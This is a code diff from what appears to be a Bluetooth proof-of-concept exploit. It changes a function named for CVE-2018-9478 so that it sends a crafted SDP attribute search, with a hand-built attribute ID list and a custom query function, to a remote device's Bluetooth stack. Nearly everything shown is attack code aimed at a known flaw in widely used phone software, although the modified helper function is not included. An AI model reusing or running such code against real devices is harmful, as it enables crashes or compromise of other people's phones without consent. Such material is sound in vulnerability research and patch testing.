@@ -162,10 +162,11 @@ static void do_l2cap_connect(int psm)
 
 static void do_CVE_2018_9478()
 {
-    const uint8_t attribute_list[] = {0xde, 0xad, 0xbe, 0xef};
-    uint8_t result = sdp_client_service_attribute_search(
-        &handle_sdp_client_query_result, remote_addr, SDP_ServiceRecordHandle, attribute_list);
-    printf("SDP query status: %d", result);
+    uint8_t des_attributeIDList[] = {0x35, 0x05, 0x0A, 0x00, 0x01, 0xff, 0xff}; // Attribute: 0x0001 - 0x0100
+    uint8_t result = sdp_client_service_attribute_search_cve(
+        &handle_sdp_client_query_result, remote_addr, SDP_ServiceRecordHandle, des_attributeIDList);
+    //uint8_t result = sdp_client_query_uuid16(&handle_sdp_client_query_result, remote_addr, BLUETOOTH_ATTRIBUTE_PUBLIC_BROWSE_ROOT);
+    printf("SDP query status: %d\n", result);
 }
 
 static void packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
